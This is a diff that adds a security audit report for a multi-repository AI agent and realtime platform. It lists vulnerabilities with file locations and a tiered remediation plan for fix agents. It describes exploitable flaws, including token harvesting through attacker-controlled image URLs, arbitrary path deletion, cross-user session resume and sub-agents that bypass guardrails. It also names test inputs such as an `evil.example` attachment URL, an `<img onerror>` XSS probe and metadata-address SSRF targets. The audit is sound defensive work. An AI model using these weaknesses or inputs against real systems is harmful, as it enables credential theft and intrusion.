+- **Git history of all twelve repos is clean.** Every credential-shaped string is a test fixture or a documentation placeholder, and the only env files ever tracked are realtime-examples' local configs with dummy LocalStack keys.
+
+### New findings
+
+aws-agentcore:
+
+- **High** Fleet devbox boxes are reused across users with no workspace reset, and a job may set `resume`, which runs `claude --continue` on the previous occupant's conversation and files in the shared workspace mount. `agents/devbox/main.py:140-146`, `middleware/src/lib/job-dispatcher.ts:232`, `providers/agent-jobs.ts:312`. *Unverified:* whether the dispatcher restricts a job to boxes owned by its creator.
+- **Medium** Sub-agents run with no Bedrock guardrail (only the supervisor gets one) and the guardrail is pinned to the mutable `DRAFT` version; the middleware invokes sub-agents directly in three places, bypassing the supervisor. `infra/lib/agentcore-runtime-stack.ts:532-556`, `lib/harness-runner.ts:269`, `lib/project-runner.ts:51`, `routes/invocations.ts:875`.
+- **Medium** The knowledge base indexes the whole documents bucket with no inclusion prefix and retrieval applies no tenant filter. `infra/lib/knowledge-base-stack.ts:316-321`, `agents/_shared/kb_resolver.py:90-100`.
+- **Medium** The devbox clone op deletes whatever absolute path the payload names before cloning; the workspace root is computed but never used to confine it. `agents/devbox/main.py:497-500`, `lib/devbox-git.ts:74`.
+- **Medium** The supervisor lets the model choose `session_id` for every sub-agent call and passes it through as the runtime session id. `agents/supervisor/main.py:138-139,167-264`.
+- **Medium (money)** The main chat agent invoke and `/summarize` neither reserve nor record spend, and `/api/agents` has no rate limit beyond an 8,000 character cap; the other model helpers only record to the ledger and never gate. `routes/agents.ts`, `index.ts:233`, `lib/conversation-summarize.ts`.
+- **Medium (money)** Unattributed spend is allowed unless `SPEND_HOLDS_UNATTRIBUTED=refuse`, and `BUDGET_FAIL_CLOSED` falls back to the `NODE_ENV` check; infra sets neither. `lib/spend-holds.ts:194-196`, `lib/budget-decisions.ts:48`.
+- **Low** The supervisor trusts the unsigned `auth` block in its payload for tenant and role. `agents/supervisor/main.py:471-492`.
+- **Low** The ingestion agent reads any S3 key and starts knowledge-base syncs from model output. `agents/ingestion/main.py:99-214`.
+- **Low** The devbox runtime has public egress, skipped permissions and the lab run token in the process environment. `infra/lib/devbox-stack.ts:281`, `agents/devbox/main.py:171-180`.
+- **Low** Twenty-four demo accounts, including an operator with `admin` in all five tenants and real-looking emails, sit in `schema/identity_schema.sql:69-135`.
+- **Low** Prompts and responses are logged to CloudWatch. `agents/devbox/main.py:565`, `agents/supervisor/main.py:141,155,702`.
+- **Low** No row-level security on any tenant table; the AgentCore policy engine is created with no policies and the admin Cedar policy has no tenant condition. `infra/lib/agentcore-policy-stack.ts:17-21`, `middleware/seeds/roles/admin.cedar:6-11`.
+- **Low** The middleware production image has no `USER` and runs as root. `middleware/Dockerfile:22`.
+- **Low** Extra keys in the agent invoke body are forwarded to the runtime as structured input, up to 64 KiB. `routes/agents.ts:635-650`.
+
+realtime-modules and the browser clients:
+
+- **High** Any chat participant can harvest every viewer's realtime bearer token: the attachment hook sends `Authorization: Bearer <token>` to any attachment URL whose content type starts with `image/`, the sender writes the attachment URLs, and the server never rewrites them. `realtime-modules/src/client/useAttachmentSrc.ts:76-81`, `src/chat/ChatService.ts:903-905`, `portal/src/lib/conversationComposer.ts:39-49`.
+- **Medium** A socket authenticated once stays authorised until it closes; token expiry is never enforced after the upgrade. `src/server-ws/createWsHandler.ts:236-300`.
+- **Medium** realtime-examples puts the reconnect session token in the websocket URL query string and keeps the Cognito ID token in localStorage, rebroadcast to every tab. `frontend/src/hooks/useWebSocket.ts:162-168`, `useAuth.ts:22-23,53-56,335`.
+- **Low** realtime-examples ships the `?as=` identity override helper in the production bundle. `frontend/src/utils/devIdentityLink.ts:11-45`.
+- **Low** Document attachments render any URL scheme as a link; agent card hrefs are opened with no scheme check. `ui-components/src/components/doc-editor/AttachmentsPanel.tsx:69-72,176-180`, `portal/src/components/chat/ConversationAgentCard.tsx:40-42`.
+- **Low** realtime-examples session restore returns the stored client id and subscriptions to whoever holds the token, without checking the fresh JWT's subject. `src/middleware/reconnection-handler.ts:36-52`.
+
+platform-api, managed-nosql-store, service-runtime:
+
+- **Medium** The platform-api media catalog is readable by any authenticated user from any organisation, and one user can fill it with 40 MB batches. `src/routes/media.ts:70-87`, `src/repositories/MediaCatalogRepository.ts:89`, `src/app.ts:81`.
+- **Low** The platform-api admin bearer is compared with `!==` and `SKIP_AUTH=true` bypasses admin entirely; the LVS admin token defaults to the literal `admin` in two callers. `src/middleware/requireAdmin.ts:19,30-33,52`, `src/routes/recordings.ts:673`, `src/lib/lvs-webhook-bootstrap.ts:53`.
+- **Medium** managed-nosql-store acknowledges writes before the WAL is fsynced (one second timer), so a single-node crash loses acknowledged data despite the design doc saying none. `src/store/DurableItemStore.ts:64-69`, `distributed-core/src/persistence/wal/WALWriter.ts:19-45`.
+- **Low** One shared HMAC secret and a service-id allowlist means any secret holder can present as `orchestrator` or `oncall-cli`, which is allowlisted in three places and defined nowhere. `service-runtime/src/auth/require-service-auth-raw-http.ts:67`, `realtime-examples/src/server.ts:2679,2701`.
+- **Low** Compose files in message-queue, managed-nosql-store, live-video-streaming and realtime-examples publish 37 ports on all interfaces; CI actions in all four repos with workflows are pinned by tag, not SHA.
+
+Content Security Policy readiness (for the headers work): no `eval`, no remote fonts, no third-party scripts, so a nonce-based `script-src` works today. A strict `style-src` breaks on inline style props (portal 11, ui-components 264, realtime-examples 42) and three rendered `<style>` tags; `img-src`/`media-src` need `blob:` and `data:`; mediapipe needs `'wasm-unsafe-eval'` and `worker-src blob:`; `connect-src` hosts come from the realtime-token response, so the policy must be generated per environment.
+
+Verified clean in this pass: masquerade (Cedar-gated, logged, no nesting); gateway uploads (uploader-only PUT, live channel check, type allowlist, size cap, read check, nosniff and a sandboxing CSP on download); runtime session ids scoped to the actor; devbox git token handling (env of the git child only), command safe mode, model allowlist and process-group kill; gateway tools (sql guard, read-only secret, SigV4); service callbacks (method, target, body, audience, nonce); read-only database role allow-list; no `SECURITY DEFINER`; realtime-modules notifications, reactions, presence caps, receipts, upload ownership and the deck module; platform-api image fetch SSRF guard, on-behalf-of envelope, LLM rate limit and document grants; message-queue key design, receipt handles, body cap, metrics auth; managed-nosql-store expression parser limits and snapshot paths; service-runtime fetch signing and skew checks; event-catalog has no `$ref` resolution; portal token transport (subprotocol only), storage, markdown, `window.open`, bundle env and source maps; lvs-client and lvs-react token handling.
+
+### Work list for the fix agents
+
+Each package is sized for one agent in one repository. "Done when" is the acceptance check the agent must add or run. Order within a tier is the order to pick them up; tier 1 before anything deploys again.
+
+**Tier 1, externally reachable today**
+
+1. **platform-api: no tools for user-written agent steps.** Reject `tools` on agent steps in user-submitted definitions, run tool-using steps only on the devbox runtime, spawn Claude Code with a minimal environment (no `REALTIME_JWT_SECRET`, `ADMIN_TOKEN`, AWS keys). Files: `src/routes/pipelineTriggers.ts`, `src/routes/pipelineDefinitions.ts`, `src/handlers/AgentStepHandler.ts`, `ClaudeCodeAgentClient.ts`. Done when a test posts a definition with an `agent` step requesting `Bash` and gets 400, and the spawn env in a unit test contains only the allowlisted keys.
+2. **live-video-streaming: remove the legacy surface.** Delete the socket.io signalling server and the `/rooms`, `/streams`, `/transports` routes, or put every one behind a participant token scoped to the room; require the admin token for `dashboard:subscribe`. Files: `src/websocket/index.js`, `src/handlers/api/index.js`, `src/api/transports/*`. Done when an unauthenticated `consume` request and an unauthenticated `dashboard:subscribe` both fail in an integration test.
+3. **live-video-streaming: sessions, recordings, webhooks behind auth.** `/api/sessions` accepts only the service token (or enforces lobby rules and `sub === userId`); recordings, transcripts and the recording SSE stream require a token scoped to the arn; `event-subscriptions` sits behind `opsAuth` and refuses private and link-local targets. Files: `src/api/sessions/index.js`, `src/api/channels/index.js`, `src/api/event-subscriptions.js`. Done when each route returns 401 without a token in tests and the webhook target validator rejects `169.254.169.254` and `10.0.0.1`.
+4. **live-video-streaming: rotate and externalise credentials.** Replace `turnuser:turnpass` and `webrtc123` with `use-auth-secret` from a per-environment secret, add `denied-peer-ip` for the private ranges, regenerate the DTLS key outside the repo, drop `proxy-ca.pem` from the image, default `LVS_JWT_HS256_ALLOWED=false`, set `ENV NODE_ENV=production`. Files: `k8s/base/coturn.yaml`, `k8s/base/sfu.yaml`, `k8s/base/dtls-cert.yaml`, `Dockerfile`, `src/middleware/bearerAuth.js`. Done when `git grep` finds none of the old values and a CI step fails on base64-encoded private keys.
+5. **aws-agentcore middleware: one grant rule.** A shared `canGrant(session, tenant, role)` used by identity PUT and POST, access provisioning and the seeds: `admin` only from `admin`, no self-edits, user create is not an upsert and never touches email. Files: `routes/identity.ts`, `providers/identity.ts`, `lib/access-provision.ts`. Done when tests show a `program-lead` cannot add `admin`, cannot modify their own grants, and a second POST for an existing id returns 409.
+6. **aws-agentcore middleware: local compute binds to owned nodes.** Refuse `local:*` jobs with no `nodeId`, require the caller owns it, make the claim query skip untargeted jobs, update a pairing on conflict only for the same owner and never clear `revoked_at`, validate `repo` against the repo pattern. In the worker use `execFileSync('git', ['clone', '--', url, name])` and replace `--dangerously-skip-permissions` with a settings allowlist. Files: `routes/work.ts`, `providers/agent-jobs.ts`, `providers/local-compute.ts`, `routes/local-compute.ts`, `tools/local-compute-worker.mjs`. Done when a test enqueues an untargeted `local:*` job and gets 400, and a pairing claim with another owner's node id yields a fresh id.
+7. **realtime-modules: attachment token leak.** In `useAttachmentSrc` attach the header only for same-origin URLs or bare `/api/uploads/` paths; on the server accept attachment ids only and emit the download URL. Files: `src/client/useAttachmentSrc.ts`, `src/chat/ChatService.ts`, `src/fileupload/FileUploadService.ts`. Done when a unit test with an `https://evil.example/x.png` attachment performs a fetch with no `Authorization` header, and a chat send with a raw URL attachment is rejected.
+8. **realtime-modules: hooks fail closed.** `CRDTService` refuses to start without `authz` and also consults the router's channel check; document actions authorise the channel they touch and reject frames where `documentId` and `channel` disagree; `allowUntargetedInvites` defaults false and non-invite call signals go only to participants; host powers never fall back to `payload.userId`; rooms gate every action on `room:<slug>` and take identity from the auth context; DM membership is enforced for any `…:dm:` segment and `dmg` fails closed without members; rate limiting on by default with a 1 MiB payload and caps on queue depth and channels per socket; close the socket when the token's `exp` passes. Files: `src/server/CRDTService.ts`, `src/call/CallService.ts`, `src/room/RoomService.ts`, `src/chat/dmChannels.ts`, `src/server-ws/createWsHandler.ts`. Done when a test per module shows a socket in tenant A receives zero frames from tenant B, and a connection with a 1 second token closes within the grace period.
+9. **platform-api: lobby admission and token checks.** `LOBBY_AUTHORITY_REQUIRED` on by default, `mayUsePartition` mandatory for every tenant-prefixed lobby, Cognito verification checks `client_id`/`aud` and `token_use`, CORS uses an allowlist, `SKIP_AUTH` refused outside an explicit dev flag, `requireAdmin` uses `timingSafeEqual` and never bypasses on a missing token, LVS admin token has no `'admin'` default, media catalog keyed and filtered by `orgId` with per-user batch caps, `ENV NODE_ENV=production` in the Dockerfile. Files: `src/lib/lobbyAccess.ts`, `src/middleware/auth.ts`, `src/middleware/requireAdmin.ts`, `src/app.ts`, `src/routes/media.ts`, `src/routes/recordings.ts`, `src/lib/lvs-webhook-bootstrap.ts`. Done when a token from another org is refused for `orgiq:initiative:x` and a user from org B cannot list org A's media.
+10. **message-queue and event-catalog: authentication on by default.** Helm sets `NODE_ENV=production` and reads the auth secret from a Kubernetes Secret, network policy on; `/admin/acls` and the read routes behind the matching permission; queues without an access list deny once auth is on; tokens never logged. Catalog admin API requires auth whenever a queue secret is configured, GET requests included; dead-letter replay requires auth and re-validates the payload; validating publisher defaults to `strict` server-side. Files: `message-queue/helm/message-queue/templates/configmap.yaml`, `values.yaml`, `src/api/routes.ts`, `src/api/authMiddleware.ts`; `event-catalog/src/server/auth.ts`, `src/server/routes.ts`, `routes/dlq.ts`, `src/utils/validating-publisher.ts`. Done when `helm template` with default values renders no deployment lacking the secret, and unauthenticated GETs on the catalog's dead-letter route return 401.
+11. **ui-components and realtime-modules: editor XSS.** Sanitise `SharedTextEditor` content with DOMPurify or replace it with the Tiptap editor; render the email template preview in a sandboxed iframe without scripts; run attachment hrefs through `safeHref`; raise the tiptap and prosemirror peer floors. Files: `ui-components/src/components/collaboration/SharedTextEditor.tsx`, `identity/admin/EmailTemplateFormPage.tsx`, `doc-editor/AttachmentsPanel.tsx`, `package.json`; `realtime-modules/src/client/SharedTextEditor.tsx`. Done when a test feeds `<img onerror=…>` and the rendered DOM has no handler attributes, and `npm ls @tiptap/core` resolves to a fixed version.
+
+**Tier 2, needs network position or a login**
+
+12. **distributed-core: cluster identity.** Verify signatures against a configured member key list or cluster CA, never the key in the message; include `signedAt` and reject stale messages; require signatures (or mutual TLS) on gossip and Raft when security is configured; default bind to `127.0.0.1`; host allowlist and private-address block for the pipeline webhook action; timestamp in outgoing webhook signatures; bump `ws` and `js-yaml`. Files: `src/identity/KeyManager.ts`, `src/messaging/cluster/ClusterCommunication.ts`, `src/transport/*Adapter.ts`, `src/applications/pipeline/PipelineExecutor.ts`, `src/common/webhook-signature.ts`. Done when a test signs with a fresh unpinned key and the message is refused, and a webhook action to a link-local address is refused before any connection.
+13. **service-runtime: request-bound signing.** The raw-HTTP gate uses `verifyServiceRequest` (method, path, audience), caps the body read, fails closed when the secret is unset regardless of `NODE_ENV`, returns a generic 401, enforces a 32 byte minimum secret, keeps a nonce cache for mutating routes; per-service secrets instead of one shared one. Files: `src/auth/require-service-auth-raw-http.ts`, `src/http-service-auth.ts`. Then update every consumer (middleware internal routes, realtime-examples internal routes, message-queue). Done when a captured header replayed against a different path is refused in a test.
+14. **pipeline-runtime: authorise before persisting approvals.** Run `authorizeApproval` in `approve()` before any write, re-authorise loaded decisions on resume, never default the approver to `local`. Files: `src/durable/runner.ts`, `resume.ts`. Done when a test restarts a run with a saved unauthorised approval and the gate stays closed.
+15. **aws-agentcore devbox and agents.** Wipe the workspace and `~/.claude` between jobs from different actors and refuse `resume` across actors; confine the clone target under the workspace mount with `realpath` in both `main.py` and `buildGitOpPayload`; remove `session_id` from the supervisor's tool schemas and derive it server-side; sign the `auth` block with the existing callback envelope and verify it; restrict ingestion keys to the run's prefix and make sync middleware-initiated; guardrail on every runtime with a published version; one knowledge-base data source per tenant prefix with a tenant filter on retrieval; take `fetch_web_page` away from agents holding graph or KB access; wrap document text in tagged delimiters in graph-builder; move demo identities to a dev-only seed; log lengths and hashes, not content. Files: `agents/devbox/main.py`, `agents/supervisor/main.py`, `agents/ingestion/main.py`, `agents/search/main.py`, `agents/graph-builder/main.py`, `agents/_shared/kb_resolver.py`, `infra/lib/agentcore-runtime-stack.ts`, `infra/lib/knowledge-base-stack.ts`, `middleware/src/lib/job-dispatcher.ts`, `schema/identity_schema.sql`. Done when a test job with `resume: true` from a different actor is refused, a clone target of `/etc` raises before any delete, and `cdk synth` shows a guardrail id on every runtime.
+16. **aws-agentcore middleware: money.** Route the chat agent invoke and `/summarize` through `reserveSpend` and the ledger; per-user rate limit on `/api/agents`; set `SPEND_HOLDS_UNATTRIBUTED=refuse` and `BUDGET_FAIL_CLOSED=true` in the task definition; `/api/lab` and the person-relink route gated by tenant; ingest prefix allowlist; `SERVICE_AUTH_LEGACY_HEADERS=refuse` once callers sign; `email_verified` required before SSO linking. Files: `routes/agents.ts`, `lib/conversation-summarize.ts`, `routes/lab.ts`, `routes/identity.ts`, `routes/ingest.ts`, `lib/oidc.ts`, `infra/lib/middleware-service-stack.ts`. Done when an invoke against an exhausted user budget returns the spend refusal and the ledger shows a row per invoke.
+17. **realtime-examples gateway.** `activity:broadcast` per tenant with a capped `detail`; `SKIP_AUTH` refused unless an explicit dev flag and a loopback bind; `NODE_ENV=production` in the Fargate task and Helm defaults with `SKIP_AUTH: "false"`; JWT audience and `token_use` pinned; `WSG_ORG_GATE_ENFORCE=true` and tenant derivation for every channel family; raw-length check before parse and count every frame against the limiter; Origin allowlist enforced on upgrade; client IP from the forwarded header; session restore bound to the JWT subject with the token in a frame rather than the URL; `?as=` helper behind a dev-only build flag; ID token kept in memory only; CDK refuses a public HTTP-only listener and Redis gets auth and TLS. Files: `src/realtime-fanout/raw-channel-guards.ts`, `src/server.ts`, `src/middleware/auth-middleware.ts`, `src/middleware/authz-middleware.ts`, `src/middleware/reconnection-handler.ts`, `k8s/helm/realtime-examples/values.yaml`, `lib/task-definition.ts`, `lib/fargate-service.ts`, `lib/redis-service.ts`, `frontend/src/hooks/useWebSocket.ts`, `frontend/src/hooks/useAuth.ts`, `frontend/src/utils/devIdentityLink.ts`. Done when a tenant-B socket receives no `activity:broadcast` frame from tenant A and `SKIP_AUTH=true` with `NODE_ENV` unset refuses to start.
+18. **managed-nosql-store.** Default `HOST=127.0.0.1`, loopback-bound compose ports, `MNS_ADMIN_TOKEN` required in cluster mode and checked on `/replication/inbound`, TLS and auth on Raft by default, sync-on-commit option default on for single node with the loss window stated in the docs. Files: `src/main.ts`, `docker-compose*.example.yml`, `src/cluster/raft/RaftClusterServer.ts`, `RaftNetworkTransport.ts`, `src/store/DurableItemStore.ts`. Done when a crash test (kill after ack, before timer) loses no acknowledged write with the option on.
+
+**Tier 3, hardening and hygiene**
+
+19. **aws-agentcore infra least privilege.** Scoped database role and secret per service with the master secret for migrations only; named actions on named ARNs instead of `bedrock-agentcore:*` and `GetAgentRuntime` on `*`; `aws:SourceAccount` and `aws:SourceArn` on every service trust policy; deleter Lambda scoped to this cluster; deletion protection and RETAIN on Aurora, the documents bucket and the Cognito pool; secrets by ARN fetched at start instead of `--context`; Cognito MFA optional with TOTP, no admin password flow outside dev, localhost callbacks only on dev pools; `deployPortal` refuses without a certificate; cdk-nag in CI. Done when `cdk synth` passes the AwsSolutions pack with documented suppressions only.
+20. **Headers and CSP across the web tier.** Helmet on the middleware, platform-api and the gateway; a CloudFront response-headers policy with HSTS, `frame-ancestors 'none'` and a nonce-based `script-src`; convert `CodeBlock` to classes and the three rendered `<style>` tags to nonces so `style-src` can tighten later; `https` required for the lobby-authority URL. Done when a response from each service carries the headers in an integration test.
+21. **Dependency and image hygiene.** Bump `ws` and `js-yaml` in distributed-core first, then `body-parser`, `fast-uri`, `systeminformation` and the OpenTelemetry pins in message-queue; `npm audit fix` in middleware, platform-api and LVS; move realtime-examples' CDK packages to devDependencies; lock Python dependencies with hashes and run pip-audit; pin base images by digest and the claude-code version; `USER node` in the middleware production stage; pin CI actions by SHA; CI gate on `npm audit --omit=dev` highs. Done when every repo's audit reports zero high or critical in production dependencies, or a documented exception.
+22. **Row-level security and Cedar.** Once per-service database roles exist, enable RLS on tenant-bearing tables keyed on a per-request session setting; attach a deny-by-default policy set to the AgentCore policy engine and give the gateway tools an explicit allow list; add a tenant condition to the admin Cedar policy or document it as break-glass with an audit alert. Done when a query under the application role with the wrong tenant setting returns zero rows in a test.
